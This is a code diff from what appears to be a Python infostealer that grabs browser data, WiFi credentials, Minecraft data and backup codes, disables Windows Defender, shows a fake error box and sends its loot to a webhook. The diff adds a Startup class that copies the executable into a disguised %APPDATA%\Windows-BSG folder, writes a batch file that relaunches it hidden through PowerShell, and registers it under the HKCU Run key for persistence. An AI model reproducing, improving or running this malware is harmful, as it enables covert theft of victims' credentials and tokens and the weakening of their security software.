@@ -58,7 +58,7 @@ def main(webhook: str):
     if __CONFIG__["antidebug_vm"]:
         Debug()
 
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, Startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -122,7 +122,7 @@ def configcheck(list):
     if not __CONFIG__["error"]:
         list.remove(fakeerror)
     if not __CONFIG__["startup"]:
-        list.remove(startup)
+        list.remove(Startup)
     if not __CONFIG__["defender"]:
         list.remove(disable_defender)
     if not __CONFIG__["browser"]:
@@ -137,14 +137,6 @@ def configcheck(list):
 
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
-
-
-def startup():
-    startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Start-up")
-    target_path = os.path.join(startup_path, os.path.basename(__file__))
-    if os.path.exists(target_path):
-        os.remove(target_path)
-    subprocess.run(["copy", __file__, startup_path], shell=True, check=True)
 
 
 def self_destruct():
@@ -538,6 +530,42 @@ class Discord:
         }
         self.robloxinfo(webhook)
         requests.post(webhook, json=data1)
+
+
+class Startup:
+    def __init__(self) -> None:        
+        self.working_dir = os.getenv("APPDATA") + "\\Windows-BSG"
+    
+        if self.check_self():
+            return
+
+        self.mkdir()
+        self.write_stub()
+        self.regedit()
+    
+    def check_self(self) -> bool:
+        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
+            return True
+
+        return False
+    
+    def mkdir(self) -> str:
+        if not os.path.isdir(self.working_dir):
+            os.mkdir(self.working_dir)
+        
+        else:
+            shutil.rmtree(self.working_dir)
+            os.mkdir(self.working_dir)
+    
+    def write_stub(self) -> None:
+        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
+        
+        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
+            f.write(f'@echo off\nif not DEFINED IS_HIDDEN set IS_HIDDEN=1 && powershell "start "%~dpnx0" -WindowStyle Hidden %*" && exit\ncall {self.working_dir}\\dat.txt')
+    
+    def regedit(self) -> None:
+        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/f"], shell=True)
+        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
 
 
 @trygrab
